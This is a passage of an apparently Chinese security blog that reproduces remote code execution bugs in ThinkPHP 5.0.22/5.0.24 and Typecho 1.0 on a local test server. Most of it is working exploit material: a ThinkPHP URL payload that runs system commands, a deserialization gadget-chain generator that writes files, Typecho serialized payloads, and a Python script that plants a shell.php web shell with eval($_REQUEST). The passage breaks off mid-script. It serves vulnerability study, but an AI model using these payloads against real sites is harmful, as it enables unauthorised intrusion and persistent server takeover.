class=\"line\">http://127.0.0.1/thinkphp_5.0.22/public/?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>\n<p>程序入口 public/index.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">// [ 应用入口文件 ]</span><br><span class=\"line\">// 定义应用目录</span><br><span class=\"line\">define(&#x27;APP_PATH&#x27;, __DIR__ . &#x27;/../application/&#x27;);</span><br><span class=\"line\">// 加载框架引导文件</span><br><span class=\"line\">require __DIR__ . &#x27;/../thinkphp/start.php&#x27;;</span><br></pre></td></tr></table></figure>\n<p>public/start.php 会去调用 App 类的 run 方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">namespace think;</span><br><span class=\"line\">// ThinkPHP 引导文件</span><br><span class=\"line\">// 1. 加载基础文件</span><br><span class=\"line\">require __DIR__ . &#x27;/base.php&#x27;;</span><br><span class=\"line\">// 2. 执行应用</span><br><span class=\"line\">App::run()-&gt;send();</span><br></pre></td></tr></table></figure>\n<p>run () 有两个比较重要的方法：routeCheck () 方法和 exec () 方法</p>\n<p>由于未设置调度信息，所以 $dispatch 为 null，进入 if 循环调用 routeCheck () 方法进行 URL 路由检测</p>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109231449360-339105155.png\" alt=\"img\"></p>\n<p>跟进 routeCheck () 方法，看到最上面 $path 通过 path () 方法获取，值为 payload 中 s 后面的参数 &quot;index/think\\app/invokefunction&quot;</p>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110000212836-250916839.png\" alt=\"img\"></p>\n<p>这里可以尝试跟进一下 path () 方法：</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234256747-1493465291.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234256747-1493465291.png\" alt=\"img\"></a></p>\n<p>最后返回的<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>p</mi><mi>a</mi><mi>t</mi><mi>h</mi><mtext>是</mtext></mrow><annotation encoding=\"application/x-tex\">this-&gt;path是</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord cjk_fallback\">是</span></span></span></span> pathinfo 获取来的，$pathinfo 又是通过 pathinfo () 方法获取来的，跟进 pathinfo () 方法</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234406178-487044200.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234406178-487044200.png\" alt=\"img\"></a></p>\n<p>看到这里基本上就破案了，先判断通过 $_GET 方式传递过来的参数中有没有 s 传递过来的参数，如果有的话就获取，最后去掉两边的’ / ' 然后 return，也就是 &quot;index/think\\app/invokefunction&quot;</p>\n<p>继续往下走，可以看到有如下判断</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$must = !is_null(self::$routeMust) ? self::$routeMust : $config[&#x27;url_route_must&#x27;];</span><br></pre></td></tr></table></figure>\n<p>如果开启了强制路由，那么输入的路由将报错导致后面导致程序无法运行，也就不存在 RCE 漏洞，但是默认是关闭的。</p>\n<p>最后调用 Route::parseUrl ()</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110000726472-759985507.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110000726472-759985507.png\" alt=\"img\"></a></p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110001554366-91094100.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110001554366-91094100.png\" alt=\"img\"></a></p>\n<p>先通过 str_replace () 函数将url(\"index/think\\app/invokefunction\")中的' / '替换成' | '，然后调用parseUrlPath对 url 进行分割，会把 index/\\think\\app/invokefunction 以’ / ' 为分隔符，分成 [‘index’,‘think\\app’,‘invokefunction’]。</p>\n<p>根据 thinkphp 路由规则 index 为模块 、think\\app 为控制器、invokefunction 为操作，最后封装成路由</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110002217354-1465544639.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110002217354-1465544639.png\" alt=\"img\"></a></p>\n<p>到这里为止 App::routeCheck () 方法才算走完</p>\n<p>继续往下读 App.php 的代码，关键代码在 App::exec 中，因为返回值中为 module，因此进入黄色部分</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110003646394-1878424898.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110003646394-1878424898.png\" alt=\"img\"></a></p>\n<p>跟进 module 方法，黄色部分检测 module 是否存在，不存在则报错。<a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171434352-913856897.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171434352-913856897.png\" alt=\"img\"></a></p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171606416-1486045006.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171606416-1486045006.png\" alt=\"img\"></a></p>\n<p>上面代码表示只要<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mi>u</mi><mi>l</mi><mi>e</mi><mtext>存在，并且</mtext></mrow><annotation encoding=\"application/x-tex\">module存在，并且</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">存</span><span class=\"mord cjk_fallback\">在</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">并</span><span class=\"mord cjk_fallback\">且</span></span></span></span> available 为 True，就可以初始化模块，并进行调用。</p>\n<p>继续往下看代码，构造控制器的过程调用了 Loder::controller 方法，然后又调用了 self::getModuleAndClass 该方法就是获取 Module、Class 的，这里通过判断name中是否存在' \\ '，若存在class就是name，此时name，此时name为think\\App，因此 class=think\\App，至此就成功调用了 App 类</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172601127-1107177748.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172601127-1107177748.png\" alt=\"img\"></a></p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172622437-2009673675.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172622437-2009673675.png\" alt=\"img\"></a></p>\n<p>控制器之后会获取当前的操作名，跟进 self::invokeMethod ()</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110173942307-1901023290.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110173942307-1901023290.png\" alt=\"img\"></a></p>\n<p>该方法里用了 ReflectionMethod 来构造 App 类的 invokefunction 方法，然后就是调用 App::invokefunction ()</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174034070-926914784.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174034070-926914784.png\" alt=\"img\"></a></p>\n<p>跟进 App::invokefunction ()，最后就是执行命令的地方，利用 ReflectionFunction，来构造自己想要的函数执行即可，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mi>u</mi><mi>n</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mtext>、</mtext></mrow><annotation encoding=\"application/x-tex\">function、</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord cjk_fallback\">、</span></span></span></span>vars，都可以通过 $_GET 方式获取</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174321981-478185155.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174321981-478185155.png\" alt=\"img\"></a></p>\n<p>因此通过 url 传参 function=call_user_func_array&amp;vars [0]=system&amp;vars [1][]=whoami</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174725217-873714846.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174725217-873714846.png\" alt=\"img\"></a></p>\n<p>5.0.22 铺垫结束，其实真正的反序列化在 5.0.24，但利用条件苛刻，只有二次开发实现了反序列化才可以利用，在 /application/index/controller/Index.php 中添加反序列化反序列化触发点代码</p>\n<p>所以只给个 payload，开摆！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    namespace think\\session\\driver;</span><br><span class=\"line\">    use think\\cache\\driver\\File;</span><br><span class=\"line\">    class Memcached&#123;</span><br><span class=\"line\">        protected $handler = null;</span><br><span class=\"line\">        function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;handler = new File();  //此处赋值$this-&gt;handler为File类的一个对象，这样就可以调用File.php::set()方法</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\cache;</span><br><span class=\"line\">    abstract class Driver&#123;</span><br><span class=\"line\">        function __construct()&#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\cache\\driver;</span><br><span class=\"line\">    use think\\cache\\Driver;</span><br><span class=\"line\">    class File extends Driver&#123;  //此处重写File.php::set方法，构造写入的$filename</span><br><span class=\"line\">        protected $tag;</span><br><span class=\"line\">        protected $options = [];</span><br><span class=\"line\">        function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;tag = &#x27;nocatch&#x27;;</span><br><span class=\"line\">            $this-&gt;options = [</span><br><span class=\"line\">                &#x27;cache_subdir&#x27;=&gt;false,</span><br><span class=\"line\">                &#x27;prefix&#x27;=&gt;&#x27;&#x27;,</span><br><span class=\"line\">                &#x27;path&#x27;=&gt;&#x27;php://filter/write=string.rot13/resource=./static/&lt;?cuc cucvasb();?&gt;&#x27;,  //rot13编码</span><br><span class=\"line\">                &#x27;data_compress&#x27;=&gt;false,</span><br><span class=\"line\">            ];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\console;</span><br><span class=\"line\">    use think\\session\\driver\\Memcached;</span><br><span class=\"line\">    class Output&#123;</span><br><span class=\"line\">        private $handle = null;</span><br><span class=\"line\">        protected $styles = [];</span><br><span class=\"line\">        function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;styles = [&#x27;removeWhereField&#x27;];  </span><br><span class=\"line\">            $this-&gt;handle = new Memcached();  //此处赋值$this-&gt;handle为Memcached的一个对象，来调用Memcached::write()方法</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\model;</span><br><span class=\"line\">    use think\\console\\Output;</span><br><span class=\"line\">    abstract class Relation&#123;</span><br><span class=\"line\">          protected $query;</span><br><span class=\"line\">          protected $foreignKey;</span><br><span class=\"line\">          function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;query = new Output();  //此处赋值$this-&gt;query为Output的一个对象，这样因为不存在removeWhereField方法，从而会调用Output类的__call方法</span><br><span class=\"line\">            $this-&gt;foreignKey = &quot;aaaaaaaaa&quot;;  //参数</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\model\\relation;</span><br><span class=\"line\">    use think\\model\\Relation;</span><br><span class=\"line\">    abstract class OneToOne extends Relation&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\model\\relation;</span><br><span class=\"line\">    class HasOne extends OneToOne&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think;</span><br><span class=\"line\">    use think\\model\\relation\\HasOne;</span><br><span class=\"line\">    use think\\console\\Output;</span><br><span class=\"line\">    abstract class Model&#123;</span><br><span class=\"line\">        protected $append = [];</span><br><span class=\"line\">        protected $error;</span><br><span class=\"line\">        protected $parent;</span><br><span class=\"line\">         function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;append = [&#x27;bmjoker&#x27;=&gt;&#x27;getError&#x27;];</span><br><span class=\"line\">            $this-&gt;error = new HasOne();  //此处赋值$this-&gt;error为类HasOne的一个对象</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\process\\pipes;</span><br><span class=\"line\">    use think\\model\\concern\\Conversion;</span><br><span class=\"line\">    use think\\model\\Pivot;</span><br><span class=\"line\">    class Windows</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        private $files = [];</span><br><span class=\"line\">        public function __construct()</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $this-&gt;files=[new Pivot()];  //此处赋值$filename为类Pivot的一个对象</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\model;</span><br><span class=\"line\">    use think\\Model;</span><br><span class=\"line\">    class Pivot extends Model&#123;&#125;  //此处会自动调用Model类</span><br><span class=\"line\"></span><br><span class=\"line\">    use think\\process\\pipes\\Windows;</span><br><span class=\"line\">    echo base64_encode(serialize(new Windows()));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>注意这个洞在 windows 下是复现不了的，因为 windows 对文件名有限制，会写入失败。</p>\n<h3 id=\"typecho-反序列化漏洞\"><a class=\"markdownIt-Anchor\" href=\"#typecho-反序列化漏洞\">#</a> typecho 反序列化漏洞</h3>\n<p>复现条件：php=5.x typecho 版本 typecho-1.0-14.10.10-release</p>\n<p>安装前先去数据库创建 typecho 库，不然安装时报错</p>\n<p>url 中输入 (<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMToxODg4OC90eXBlY2hvLw==\">http://127.0.0.1:18888/typecho/</span>) 自动跳转安装页面，里面的内容根据自己的填</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125094835151.png\" alt=\"image-20221125094835151\"></p>\n<p>任意命令执行 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Typecho_Feed</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    const RSS1 = &#x27;RSS 1.0&#x27;;</span><br><span class=\"line\">    const RSS2 = &#x27;RSS 2.0&#x27;;</span><br><span class=\"line\">    const ATOM1 = &#x27;ATOM 1.0&#x27;;</span><br><span class=\"line\">    const DATE_RFC822 = &#x27;r&#x27;;</span><br><span class=\"line\">    const DATE_W3CDTF = &#x27;c&#x27;;</span><br><span class=\"line\">    const EOL = &quot;\\n&quot;;</span><br><span class=\"line\">    private $_type;</span><br><span class=\"line\">    private $_items;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;_type = $this::RSS2;</span><br><span class=\"line\">        $this-&gt;_items[0] = array(</span><br><span class=\"line\">            &#x27;title&#x27; =&gt; &#x27;1&#x27;,</span><br><span class=\"line\">            &#x27;link&#x27; =&gt; &#x27;1&#x27;,</span><br><span class=\"line\">            &#x27;date&#x27; =&gt; 1508895132,</span><br><span class=\"line\">            &#x27;category&#x27; =&gt; array(new Typecho_Request()),</span><br><span class=\"line\">            &#x27;author&#x27; =&gt; new Typecho_Request(),</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class Typecho_Request</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    private $_params = array();</span><br><span class=\"line\">    private $_filter = array();</span><br><span class=\"line\">    public function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;_params[&#x27;screenName&#x27;] = &#x27;phpinfo()&#x27;;    //替换phpinfo()这里进行深度利用</span><br><span class=\"line\">        $this-&gt;_filter[0] = &#x27;assert&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$exp = array(</span><br><span class=\"line\">    &#x27;adapter&#x27; =&gt; new Typecho_Feed(),</span><br><span class=\"line\">    &#x27;prefix&#x27; =&gt; &#x27;typecho_&#x27;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">echo base64_encode(serialize($exp));</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=</span><br></pre></td></tr></table></figure>\n<p>访问：</p>\n<p><code>http://localhost:18888/typecho/install.php?finish</code></p>\n<p>通过 post 传入 payload：</p>\n<p><code>__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125104636822.png\" alt=\"image-20221125104636822\"></p>\n<p>通过 python 写 shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests </span><br><span class=\"line\">import sys </span><br><span class=\"line\">url = &quot;http://localhost/typecho/install.php?finish=&quot;</span><br><span class=\"line\">payload = &quot;YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjU4OiJmcHV0cyhmb3Blbignc2hlbGwucGhwJywndycpLCc8Pz1AZXZhbCgkX1JFUVVFU1RbNzc3XSk/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTg6ImZwdXRzKGZvcGVuKCdzaGVsbC5waHAnLCd3JyksJzw/PUBldmFsKCRfUkVRVUVTVFs3NzddKT8+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9&quot; </span><br><span class=\"line\">postData = &#123;&quot;__typecho_config&quot;:payload&#125; </span><br><span class=\"line\">header =&#123; </span><br><span class=\"line\">\t&quot;Referer&quot;:url, </span><br><span class=\"line\">\t&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&quot;&#125; </span><br><span class=\"line\">\t</span><br><span class=\"line\">print(url) </span><br><span class=\"line\">res = requests.get(url) </span><br><span class=\"line\">if res.status_code == 200: </span><br><span class=\"line\">\tprint(&quot;[+] install.php exist!&quot;) </span><br><span class=\"line\">else: </span><br><span class=\"line\">\tprint(&quot;[-] install.php not exist&quot;) </span><br><span class=\"line\">\tsys.exit() </span><br><span class=\"line\">\t</span><br><span class=\"line\">res = requests.post(url = url,data = postData,headers = header) </span><br><span class=\"line\">res = requests.get(url+&quot;shell.php&quot;) </span><br><span class=\"line\">if res.status_code == 200: </span><br><span class=\"line\">\tprint(&quot;[+] Shell.php write success!&quot;) </span><br><span class=\"line\">\tprint(&quot;Shell path 